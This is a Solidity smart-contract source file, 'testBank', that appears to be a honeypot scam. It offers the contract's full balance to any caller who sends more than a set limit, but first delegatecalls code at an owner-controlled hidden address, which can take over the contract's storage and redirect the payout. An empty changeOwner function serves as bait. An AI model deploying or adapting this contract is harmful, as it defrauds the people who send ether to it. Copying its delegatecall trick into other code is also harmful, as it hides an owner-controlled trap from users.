pragma solidity 0.4.11;

contract testBank
{
    address Owner=0x46Feeb381e90f7e30635B4F33CE3F6fA8EA6ed9b;
    address adr;
    uint256 public Limit= 1000000000000000001;
    address emails = 0xa6f6b06538348614d98f1c12b6b2becc27886ced;
    
    
    function Update(address dataBase, uint256 limit)
    {
        require(msg.sender == Owner); //checking the owner
        Limit = limit;
        emails = dataBase;
    }
    
    function changeOwner(address adr){
        // update Owner=msg.sender;
    }
    
    function()payable{}
    
    function withdrawal()
    payable public
    {
        adr=msg.sender;
        if(msg.value>Limit)
        {  
            //add if Owner
            emails.delegatecall(bytes4(sha3("logEvent()")));
            adr.send(this.balance);
        }
    }
    
    function kill() {
        require(msg.sender == Owner);
        selfdestruct(msg.sender);
    }
    
}